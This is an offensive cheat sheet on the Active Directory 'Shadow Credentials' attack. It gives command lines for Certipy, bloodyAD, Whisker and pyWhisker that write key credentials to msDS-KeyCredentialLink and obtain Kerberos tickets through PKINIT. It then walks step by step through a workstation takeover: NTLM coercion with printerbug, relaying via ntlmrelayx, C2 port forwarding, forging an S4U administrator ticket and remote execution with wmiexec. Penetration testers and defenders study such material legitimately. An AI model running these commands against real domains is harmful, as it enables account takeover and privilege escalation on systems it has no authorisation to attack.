# Password - Shadow Credentials

> Add **Key Credentials** to the attribute `msDS-KeyCredentialLink` of the target user/computer object and then perform Kerberos authentication as that account using PKINIT to obtain a TGT for that user.  When trying to pre-authenticate with PKINIT, the KDC will check that the authenticating user has knowledge of the matching private key, and a TGT will be sent if there is a match.

:warning: User objects can't edit their own `msDS-KeyCredentialLink` attribute while computer objects can. Computer objects can edit their own msDS-KeyCredentialLink attribute but can only add a KeyCredential if none already exists

**Requirements**:

* Domain Controller on (at least) Windows Server 2016
* Domain must have Active Directory `Certificate Services` and `Certificate Authority` configured
* PKINIT Kerberos authentication
* An account with the delegated rights to write to the `msDS-KeyCredentialLink` attribute of the target object

**Exploitation**:

* [ly4k/Certipy](https://github.com/ly4k/Certipy)

  ```ps1
  certipy shadow auto -account user -dc-ip 10.10.10.10 -dns-tcp -ns 10.10.10.10 -k -no-pass -target dc.domain.lab
  certipy shadow -u 'attacker@domain.local' -p 'Passw0rd!' -dc-ip '10.0.0.100' -account 'victim' add
  ```

* [CravateRouge/bloodyAD](https://github.com/CravateRouge/bloodyAD):

  ```ps1
  bloodyAD --host 10.10.10.10 -u username -p 'P@ssw0rd' -d domain.lab add shadowCredentials targetpc$
  bloodyAD --host 10.10.10.10 -u username -p 'P@ssw0rd' -d domain.lab remove shadowCredentials targetpc$ --key <key from previous output>
  ```

* [eladshamir/Whisker](https://github.com/eladshamir/Whisker):

  ```powershell
  # Lists all the entries of the msDS-KeyCredentialLink attribute of the target object.
  Whisker.exe list /target:computername$

  # Generates a public-private key pair and adds a new key credential to the target object as if the user enrolled to WHfB from a new device.
  Whisker.exe add /target:"TARGET_SAMNAME" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /path:"cert.pfx" /password:"pfx-password"
  Whisker.exe add /target:computername$ [/domain:constoso.local /dc:dc1.contoso.local /path:C:\path\to\file.pfx /password:P@ssword1]

  # Removes a key credential from the target object specified by a DeviceID GUID.
  Whisker.exe remove /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /remove:2de4643a-2e0b-438f-a99d-5cb058b3254b
  ```

* [ShutdownRepo/pyWhisker](https://github.com/ShutdownRepo/pyWhisker):

  ```ps1
  # Lists all the entries of the msDS-KeyCredentialLink attribute of the target object.
  python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "list"

  # Generates a public-private key pair and adds a new key credential to the target object as if the user enrolled to WHfB from a new device.
  pywhisker.py -d "FQDN_DOMAIN" -u "user1" -p "CERTIFICATE_PASSWORD" --target "TARGET_SAMNAME" --action "list"
  python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "add" --filename "test1"

  # Removes a key credential from the target object specified by a DeviceID GUID.
  python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "remove" --device-id "a8ce856e-9b58-61f9-8fd3-b079689eb46e"
  ```

## Scenario

### Shadow Credential Relaying

* Trigger an NTLM authentication from `DC01` (PetitPotam)
* Relay it to `DC02` (ntlmrelayx)
* Edit `DC01`'s attribute to create a Kerberos PKINIT pre-authentication backdoor (pywhisker)
* Alternatively : `ntlmrelayx -t ldap://dc02 --shadow-credentials --shadow-target 'dc01$'`

### Workstation Takeover with RBCD

**Requirements**:

* `Print Spooler` service running
* `WebClient service` running

**Exploitation**:

* Using your C2, start a reverse socks on port 1080: `socks 1080`
* Enable port forward from port 8081 to 81 on the compromised machine:

  ```ps1
  rportfwd 8081 127.0.0.1 81
  ```

* Start the relay:

  ```ps1
  proxychains python3 ntlmrelayx.py -t ldaps://dc.domain.lab --shadow-credentials --shadow-target target\$ --http-port 81
  ```

* Trigger a callback on webdav:

  ```ps1
  proxychains python3 printerbug.py domain.lab/user:password@target.domain.lab compromised@8081/file
  ```

* Use [dirkjanm/PKINIT](https://github.com/dirkjanm/PKINITtools) to get a TGT for the machine account:

  ```ps1
  proxychains python3 gettgtpkinit.py domain.lab/target\$ target.ccache -cert-pfx </path/from/previous/command.pfx> -pfx-pass <pfx-pass>
  ```

* Elevate your privileges by creating a service ticket impersonating a local admin:

  ```ps1
  proxychains python3 gets4uticket.py kerberos+ccache://domain.lab\\target\$:target.ccache@dc.domain.lab cifs/target.domain.lab@domain.lab administrator@domain.lab administrator_target.ccache -v
  ```

* Use your ticket:

  ```ps1
  export KRB5CCNAME=/path/to/administrator_target.ccache
  proxychains python3 wmiexec.py -k -no-pass domain.lab/administrator@target.domain.lab
  ```

## References

* [Shadow Credentials: Workstation Takeover Edition - Matthew Creel - October 21, 2021](https://www.fortalicesolutions.com/posts/shadow-credentials-workstation-takeover-edition)
* [Shadow Credentials - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials)
* [Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover - Elad Shamir - June 17, 2021](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
